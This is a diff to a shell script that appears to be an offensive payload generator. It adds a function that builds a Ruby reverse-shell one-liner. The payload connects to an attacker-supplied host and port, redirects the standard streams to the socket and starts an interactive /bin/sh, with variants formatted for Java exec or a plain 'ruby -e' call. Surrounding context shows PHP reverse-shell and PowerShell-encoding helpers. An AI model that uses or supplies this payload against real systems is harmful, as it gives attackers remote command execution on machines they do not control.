@@ -110,6 +110,18 @@ get_php_reverse_shell() {
 
 }
 
+get_ruby_reverse_shell() {
+    prepare_generic_linux_shell
+    local reverse_shell="require 'socket'; s=TCPSocket.open(\"$host_ip\",$host_port); [0,1,2].each{|fd| syscall(33,s.fileno,fd)}; exec(\"/bin/sh -i\")"
+    if [[ ! -z $reverse_type ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+        reverse_shell="{\"ruby\", \"-e\" , \"$reverse_shell\"}"
+    elif [[ -z $reverse_type ]] || [[ $reverse_type != "minimal" ]]; then
+        reverse_shell="ruby -e '$reverse_shell'"
+    fi
+    echo "$reverse_shell"
+}
+
 encode_powershell() {
     if [ -z "$1" ]; then
         echo "Usage: powershell_base64 <string>"
